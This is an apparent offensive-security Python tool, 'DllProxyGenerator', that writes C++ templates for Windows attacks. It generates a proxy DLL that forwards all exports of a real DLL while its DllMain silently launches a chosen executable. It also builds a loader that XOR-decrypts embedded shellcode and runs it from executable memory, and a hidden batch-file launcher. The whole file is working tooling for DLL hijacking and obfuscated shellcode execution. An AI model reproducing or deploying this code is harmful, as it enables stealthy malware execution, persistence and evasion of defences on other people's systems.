import sys
import os
import pefile
import argparse
from Crypto.Hash import MD5
from Crypto.Cipher import AES
from base64 import b64encode
from string import Template
import re

createLoader = False
createProxy = True
cppScriptPath = ""
ErrorSign = "\033[33m[!]\033[0m"
Success = "\033[32m[+]\033[0m"
Status = "\033[94m[*]\033[0m"
batstarter = False

usage = f"""

Usage: \033[0mDllProxyGenerator.py [<dll_path> <output_exe_path>] [<shellcode_path> <xor_key>] <cpp_script_path>\033[0m

/-----------------------------------------------------------------------------------------\\
----------------------------{Success}-dll-Proxy-Creation--------------------------------
\\-----------------------------------------------------------------------------------------/

<dll_path>\033[0m path to the original DLL to proxy \033[94m(e.g., "C:\Windows\System32\kernel32.dll")\033[0m

<output_exe_path>\033[0m \033[31mABSOLUTE\033[0m final path where you will store your executable Application \033[94m(e.g., C:\path\\to\ShellCodeLoader.exe)\033[0m

/------------------------------------------------------------------------------------------\\
----------------------------{Success}-ShellCodeLoader-Creation--------------------------
\\------------------------------------------------------------------------------------------/

<shellcode_path> \033[0mpath to the shellcode binary file \033[94m(e.g., ".\shellcode.bin")\033[0m

<xor_key> \033[0mkey for XOR encryption of the shellcode \033[94m(e.g., "mysecretkey")\033[0m

/-----------------------------------------------------------------------------------------\\
----------------------------{ErrorSign}-Neccessary-Output-Path-------------------------------------
\\-----------------------------------------------------------------------------------------/

<cpp_script_path>\033[0m path to save the C++ script \033[94m(e.g., ".\output.cpp")\033[0m
\033[0m
"""

startingbat = ""

if sys.argv[1] == "bat_starter":
    for i in range(2, len(sys.argv)):
        startingbat += sys.argv[i] + "\n"
    startingbat = startingbat.strip()
    batstarter = True
    createProxy = False

if not batstarter:
    dllPath = sys.argv[1] if len(sys.argv) > 1 else sys.exit(usage)
    exepath = sys.argv[2] if len(sys.argv) > 2 else sys.exit(usage)

    if len(sys.argv) > 5:
        createLoader = True
        shellcodepath = sys.argv[3]
        masterKey = sys.argv[4]

        cppScriptPath = sys.argv[5]
    else:
        cppScriptPath = sys.argv[3] if len(sys.argv) > 3 else sys.exit(usage)
        if len(sys.argv) > 4: sys.exit(usage)

    loaderName = "ShellCodeLoader - COMPILE TO EXE.cpp"
    finalProxyName = f'{ os.path.basename(cppScriptPath)} - COMPILE TO DLL.cpp'

    if dllPath == "null" and exepath == "null":
        createProxy = False


def xor(data, key):
    l = len(key)
    keyAsInt = list(map(ord, key))
    return bytes(bytearray(
        (data[i] ^ keyAsInt[i % l] for i in range(0, len(data)))
    ))


# data as a bytearray 
def formatCPP(data, key, cipherType):
    shellcode = "\\x"
    shellcode += "\\x".join(format(b, '02x') for b in data)

    chunk_size = 16 * 4  # 16 bytes each line * 4 chars/byte (including \x)

    lines = [shellcode[i:i + chunk_size] for i in range(0, len(shellcode), chunk_size)]
    shellcode = ""
    shellcode += "\n".join(lines)
    return shellcode

batstarter = """
#include <windows.h>
#include <string>
#include <vector>

//compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib /SUBSYSTEM:WINDOWS

bool start_bat(char* file)
{

    const char* tmpl = file;
    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
    if (needed == 0) {
        return false;
    }

    std::vector<char> expanded(needed);
    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
        return false;
    }

    std::string scriptPath = expanded.data();
    std::string cmdLine = std::string("/C \\"") + scriptPath + "\\"";
    std::vector<char> cmdMutable(cmdLine.begin(), cmdLine.end());
    cmdMutable.push_back('\\0');

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);


    BOOL ok = CreateProcessA(
        "C:\\\\Windows\\\\System32\\\\cmd.exe",
        cmdMutable.data(),
        nullptr, nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si, &pi);

    if (!ok) {
        DWORD err = GetLastError();
        char msg[64];
        sprintf_s(msg, "CreateProcess failed (%lu)", err);
        return false;
    }


    WaitForSingleObject(pi.hProcess, INFINITE);


    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    //STARTING_BAT
    return 0;
}
"""

shellCodeLoader = """
#include <windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <string>

static LPVOID g_alloc = nullptr;
static SIZE_T g_allocSize = 0;

LONG WINAPI VehLog(PEXCEPTION_POINTERS ep) {
    if (!ep || !ep->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    auto& er = *ep->ExceptionRecord;
    if (er.ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        ULONG_PTR rw = er.ExceptionInformation[0];
        ULONG_PTR addr = er.ExceptionInformation[1];
        std::cerr << "VEH: ACCESS_VIOLATION " << (rw ? "WRITE" : "READ")
            << " faultAddr=0x" << std::hex << addr << std::dec << "\\n";
        if (g_alloc) {
            uintptr_t base = (uintptr_t)g_alloc;
            std::cerr << "  allocBase=0x" << std::hex << base << " size=0x" << g_allocSize << std::dec << "\\n";
            if (addr >= base && addr < base + g_allocSize)
                std::cerr << "  -> Fault INSIDE allocated region.\\n";
            else
                std::cerr << "  -> Fault OUTSIDE allocated region.\\n";
        }
        std::cerr << "  ExceptionAddress = 0x" << std::hex
            << (uintptr_t)er.ExceptionAddress << std::dec << "\\n";
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int WINAPI WinMain(
    HINSTANCE hInstance,      // Handle to the current instance of the application.
    HINSTANCE hPrevInstance,  // Handle to the previous instance (always NULL in modern Windows).
    LPSTR lpCmdLine,          // Command line arguments as a null-terminated ANSI string (excluding program name).
    int nCmdShow              // Flag specifying how the window is to be shown (e.g., minimized, maximized).
) {
    PVOID vh = AddVectoredExceptionHandler(1, VehLog);

    // Example payload (choose x64/x86 match your build). Replace with any test bytes.
    SHELLCODE_PLACEHOLDER
        

    SIZE_T len = sizeof(enc);

    // Allocate RWX (or allocate RW and call VirtualProtect to RX after memcpy)
    void* exec = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) { std::cerr << "VirtualAlloc failed: " << GetLastError() << "\\n"; return 1; }
    g_alloc = exec; g_allocSize = len;

    std::cout << "Allocated exec at: " << exec << " len=0x" << std::hex << len << std::dec << "\\n";

    KEY
    size_t key_len = sizeof(key) - 1;

    for (size_t i = 0; i < len; i++)
        enc[i] = enc[i] ^ key[i % key_len];

    // Decode/COPY DIRECTLY INTO exec (no stack VLA)
    // If you have an encoded buffer, decode byte-by-byte into 'exec'.
    memcpy(exec, enc, len);

    // Ensure CPU sees new instructions
    if (!FlushInstructionCache(GetCurrentProcess(), exec, len))
        std::cerr << "FlushInstructionCache failed: " << GetLastError() << "\\n";

    // Make executable (optional if you allocated RWX)
    DWORD oldProtect = 0;
    if (!VirtualProtect(exec, len, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "VirtualProtect failed: " << GetLastError() << "\\n";
    }

    // Print memory info for debugging
    MEMORY_BASIC_INFORMATION mbi;
    if (VirtualQuery(exec, &mbi, sizeof(mbi))) {
        std::cerr << "MBI: Base=0x" << std::hex << (uintptr_t)mbi.BaseAddress
            << " RegionSize=0x" << mbi.RegionSize
            << " Protect=0x" << mbi.Protect << std::dec << "\\n";
    }

    // Choose how to run: direct call or in a thread (thread is safer under debugger)
    bool useThread = true;

    std::cout << "Calling payload at " << exec << " useThread=" << useThread << "\\n";

    DWORD tid;

    if (useThread) {
        HANDLE th = CreateThread(nullptr, 0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(exec),
            nullptr, 0, &tid);

        if (!th) {
            std::cerr << "CreateThread failed: " << GetLastError() << "\\n";
        }
        else {
            WaitForSingleObject(th, INFINITE);
            CloseHandle(th);
        }
    }
    else {
        typedef void(*fn)();
        fn f = (fn)exec;
        __try { f(); }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            std::cerr << "SEH: exception code 0x" << std::hex << GetExceptionCode() << std::dec << "\\n";
        }
    }

    // Only free AFTER payload and any threads have finished
    if (!VirtualFree(exec, 0, MEM_RELEASE)) {
        std::cerr << "VirtualFree failed: " << GetLastError() << "\\n";
    }
    else {
        std::cerr << "Memory freed\\n";
    }

    RemoveVectoredExceptionHandler(vh);
    return 0;
}
"""

cppScript = """
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <windows.h>
#include <string>
#include <vector>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

PRAGMA_COMMENTS

HMODULE hReal = nullptr;

// richtige Signatur: WINAPI (entspricht LPTHREAD_START_ROUTINE)


DWORD WINAPI StartProcess(LPVOID lpParameter)
{

    const char* tmpl = "PATH_TO_EXE";

    // First call to get required buffer size
    DWORD needed = ExpandEnvironmentStringsA(tmpl, nullptr, 0);
    if (needed == 0) {
        return false;
    }

    std::vector<char> expanded(needed);
    if (ExpandEnvironmentStringsA(tmpl, expanded.data(), needed) == 0) {
        return false;
    }

    std::string scriptPath = expanded.data();

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    std::wstring wScriptPath(scriptPath.begin(), scriptPath.end());
    std::vector<wchar_t> cmd(wScriptPath.begin(), wScriptPath.end());
    cmd.push_back(L'\\0'); // Mutable buffer req.

    BOOL ok = CreateProcessW(
        nullptr,        // let CreateProcess parse command line
        cmd.data(),     // modifiable buffer
        nullptr,
        nullptr,
        FALSE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        &si,
        &pi
    );

    if (!ok) {
        DWORD err = GetLastError();
        wprintf(L"CreateProcessW failed: %lu\\n", err);
        return err;
    }

    // optional: warten, wenn gewünscht
    // WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    if (!hReal) {
        hReal = LoadLibraryExW(L"DLLBASENAME", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
    }
    if (hReal) {
        using DllMainFn = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        DllMainFn orig = (DllMainFn)GetProcAddress(hReal, "DllMain");
        if (!orig) {
            orig = (DllMainFn)GetProcAddress(hReal, (LPCSTR)MAKEINTRESOURCEA(180));
        }
        if (orig) {
            orig(hModule, ul_reason_for_call, lpReserved);
        }
    }

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // sicherer: QueueUserWorkItem verwenden (weniger riskant in DllMain)
        // StartProcess hat kompatible Signatur (LPTHREAD_START_ROUTINE)
        if (!QueueUserWorkItem(StartProcess, nullptr, WT_EXECUTEDEFAULT)) {
            // Fallback: nichts tun oder Fehlerloggen
            wprintf(L"QueueUserWorkItem failed: %lu\\n", GetLastError());
        }
        break;
    }

    case DLL_THREAD_ATTACH:
        break;

    case DLL_THREAD_DETACH:
        break;

    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""



#======================================================================================================
# MAIN FUNCTION
#======================================================================================================
if __name__ == '__main__':
    #------------------------------------------------------------------------
    # Open shellcode file and read all bytes from it
    if createLoader:
        try:
            with open(shellcodepath, "rb") as shellcodeFileHandle:
                shellcodeBytes = bytearray.fromhex(shellcodeFileHandle.read().decode('utf-8').strip("\n").replace('"', '').replace("\\x", " "))
                print("")
                print(f"{Status} Shellcode file [{shellcodepath}] successfully loaded.")

        except IOError:
            print(ErrorSign," Could not open or read file [{}]".format(shellcodepath))
            quit()

        #------------------------------------------------------------------------
        # Perform XOR transformation
        transformedShellcode = xor(shellcodeBytes, masterKey)
        cipherType = 'xor'

    print("\n\033[32m==================================== RESULT ====================================\033[0m\n")
    if createLoader:
        print(f"{Status} Encrypted shellcode size: [{len(transformedShellcode)}] bytes")
        shellcode = formatCPP(transformedShellcode, masterKey, cipherType)
        with open(os.path.join(os.path.dirname(cppScriptPath), "payload.enc"), "w", encoding="utf-8") as f:
            f.write(shellcode)
        print(f"{Status} Shellcode written to \"payload.enc\"")
    print("")

    if createProxy:
        # Load the PE file
        dllPeHeaders = pefile.PE(dllPath)

        # Build linker redirect pragmas equivalent (corrected)
        pragmaBuilder = ""
        IMAGE_SCN_MEM_EXECUTE = 0x20000000

        for sym in dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols:
            # Skip forwarders
            if sym.forwarder is not None:
                continue
            name = sym.name.decode() if sym.name else None
            ord  = sym.ordinal
            rva  = sym.address  # already an RVA for non-forwarded exports
            section = dllPeHeaders.get_section_by_rva(rva)
            is_data = section is not None and not (section.Characteristics & IMAGE_SCN_MEM_EXECUTE)
            if name and name.startswith("Global_WindowsStorage_"):
                is_data = True
            if name:
                if is_data:
                    sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: {name} (ordinal {ord})")
                else:
                    pragmaBuilder += f'#pragma comment(linker, "/export:{name}={os.path.basename(dllPath)}.{name},@{ord}")\n'
                    print(f"{Success} Exported Funktion {name} (ordinal {ord}).")
            else:
                # unnamed ordinal
                if is_data:
                    sys.exit(f"{ErrorSign} Target-Dll exports data.\n{ErrorSign}Please provide a DLL that only exports functions (no data exports)!\n{ErrorSign}Offending export: NONAME (ordinal {ord})")
                else:
                    pragmaBuilder += f'#pragma comment(linker, "/export:ord{ord}={os.path.basename(dllPath)}.#{ord},@{ord},NONAME")\n'
                    print(f"{Success} Exported Noname Funktion (ordinal {ord}).")

        print(f"{Status} Forwarded {len(dllPeHeaders.DIRECTORY_ENTRY_EXPORT.symbols)} function calls from {finalProxyName} to {os.path.basename(dllPath)}")

        dllTemplate = cppScript.replace("PRAGMA_COMMENTS", pragmaBuilder)

        dllTemplate = dllTemplate.replace("DLLBASENAME", os.path.basename(dllPath))

        dllTemplate = dllTemplate.replace("PATH_TO_EXE", exepath.replace("\\", "\\\\"))

    if createLoader:
        shellCodeLoader = shellCodeLoader.replace("SHELLCODE_PLACEHOLDER", shellcode)
        shellCodeLoader = shellCodeLoader.replace("KEY", f'char key[] = "{masterKey}";')

    if startingbat:
        for i in range(2, len(sys.argv)):
            path = startingbat.split("\n")[i - 2].replace("\\", "\\\\")
            batstarter = batstarter.replace("//STARTING_BAT", f'//STARTING_BAT\nstart_bat("{path}");\n')

        with open("batstarter.cpp", "w", encoding="utf-8") as f:
            f.write(batstarter)
        print(f"{Status} C++ Batstarter script written to './batstarter.cpp'\n{Status} Compile with: cl /std:c++17 /EHsc batstarter.cpp /link user32.lib /SUBSYSTEM:WINDOWS")

    if createProxy:
        loaderName = f'{ os.path.basename(exepath)} - COMPILE TO EXE.cpp'
        with open(os.path.join(os.path.dirname(cppScriptPath), finalProxyName), "w", encoding="utf-8") as f:
            f.write(dllTemplate)
        print(f"{Status} C++ proxy script written to {os.path.abspath(finalProxyName)}\n{Status} Compile with: cl /LD /EHsc /std:c++17 \"{os.path.abspath(finalProxyName)}\"")
    elif cppScriptPath:
        loaderName = os.path.basename(cppScriptPath)
    
    if createLoader:
        with open(os.path.join(os.path.dirname(cppScriptPath), loaderName), "w", encoding="utf-8") as f:
            f.write(shellCodeLoader)
        print(f"{Status} C++ Loader script written to {os.path.abspath(loaderName)}")